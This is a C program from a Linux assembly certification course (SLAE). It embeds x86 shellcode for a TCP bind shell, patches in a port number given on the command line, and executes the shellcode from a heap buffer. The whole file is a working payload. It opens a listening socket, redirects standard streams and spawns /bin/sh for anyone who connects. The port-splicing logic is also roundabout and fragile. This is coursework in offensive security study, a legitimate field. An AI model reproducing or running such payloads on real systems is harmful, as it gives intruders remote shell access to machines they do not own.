/*
This code has been created for completing the requirements of the SecurityTube Linux Assembly Expertcertification:
  	
   http://securitytube-­training.com/online-courses/securitytube-linux-assembly-expert/  

Student ID: SLAE-1537
*/
#include<stdio.h>
#include<string.h>
#include<stdlib.h>

unsigned char codePart1[] = \
"\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x31\xc9\x51\x66\x68";

unsigned char codePart2[] = \
"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xc9\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xc9\x51\x51\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";

int main(int argc, const char * argv[])
{

	if(argc < 2)
	{
		printf("Usage: \n");
	        printf("./bind-tcp-shell port-number\n");
		printf("Example:\n");
		printf("./bind-tcp-shell 4444\n");
        	return 0;
	}

	const char * portNumber = argv[1];
	int size = strlen(portNumber);

	int portInt = atoi(portNumber);
	char* portHex = (char*) malloc(size*4*sizeof(char));

	sprintf(portHex, "%02x", portInt);

	unsigned char* executable = (char*) malloc(strlen(codePart1) + strlen(codePart2) + strlen(portHex) * sizeof(char));
	memset (executable,0,strlen(codePart1) + strlen(codePart2) + strlen(portHex) * sizeof(char));
	unsigned char* helper = executable;
	
	for(int j = 0; j < strlen(codePart1); j++){

		*(helper++) = codePart1[j];
	}

	FILE * f = fopen ("tmp.txt","wb");
	fwrite(&portInt, 1, sizeof(int), f);

	fflush(f);
	fclose(f);

	f = fopen ("tmp.txt","rb");
	fread(helper++,1,4,f);
	helper+=1;
	fclose (f);
	
	unsigned char tmp = *(helper-2);
	*(helper-2) = *(helper-1);
	*(helper-1) = tmp;
	
	for(int j = 0; j < strlen(codePart2); j++){

		*(helper++) = codePart2[j];
	}

	int (*ret)() = (int(*)())executable;

	ret();

	return 0;

}

	
